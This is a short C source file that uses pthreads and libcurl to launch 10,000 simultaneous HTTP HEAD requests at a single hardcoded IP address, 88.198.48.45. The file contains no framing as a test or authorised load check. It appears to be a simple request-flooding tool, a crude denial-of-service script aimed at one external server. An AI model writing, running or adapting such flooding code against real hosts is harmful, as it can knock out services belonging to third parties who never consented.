#include <stdio.h>
#include <pthread.h>
#include <curl/curl.h>

#define NUM_THREADS 10000

void *send_request(void *threadid) {
  CURL *curl;
  CURLcode res;

  curl = curl_easy_init();
  if(curl) {
    curl_easy_setopt(curl, CURLOPT_URL, "http://88.198.48.45");

    /* Perform a HEAD request by setting NOBODY to 1 */
    curl_easy_setopt(curl, CURLOPT_NOBODY, 1L);

    /* Perform the request */
    res = curl_easy_perform(curl);

    /* Check for errors */
    if(res != CURLE_OK)
      fprintf(stderr, "curl_easy_perform() failed: %s\n",
              curl_easy_strerror(res));

    /* Always cleanup */
    curl_easy_cleanup(curl);
  }

  pthread_exit(NULL);
}

int main(void)
{
  pthread_t threads[NUM_THREADS];
  int rc;
  long t;

  curl_global_init(CURL_GLOBAL_DEFAULT);

  for(t=0; t<NUM_THREADS; t++){
     rc = pthread_create(&threads[t], NULL, send_request, (void *)t);
     if (rc){
       printf("ERROR; return code from pthread_create() is %d\n", rc);
       exit(-1);
     }
  }

  /* Wait for all threads to complete */
  for(t=0; t<NUM_THREADS; t++){
     pthread_join(threads[t], NULL);
  }

  curl_global_cleanup();

  return 0;
}
